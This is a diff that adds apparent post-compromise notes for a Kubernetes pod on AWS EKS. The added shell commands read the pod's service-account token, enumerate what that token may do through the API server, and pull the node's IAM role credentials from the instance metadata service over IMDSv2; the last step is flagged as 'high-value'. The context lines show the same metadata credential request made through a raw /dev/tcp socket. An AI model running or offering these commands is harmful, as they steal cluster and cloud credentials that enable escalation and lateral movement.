@@ -72,3 +72,23 @@ exec 3<>/dev/tcp/169.254.169.254/80
 printf 'GET /latest/meta-data/iam/security-credentials/ HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token: %s\r\nConnection: close\r\n\r\n' "$TOK" >&3
 cat <&3
 ```
+
+```
+# 0a. what can the SA token do?
+NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+API=https://kubernetes.default.svc
+kubectl auth can-i --list 2>/dev/null    # if kubectl is in-pod
+curl -sk -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
+  -X POST "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
+  -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"$NS\"}}"
+
+# 0b. EKS node IAM creds via IMDSv2  ← high-value
+T=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
+      -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $T" \
+      http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+curl -s -H "X-aws-ec2-metadata-token: $T" \
+      http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
+
+```
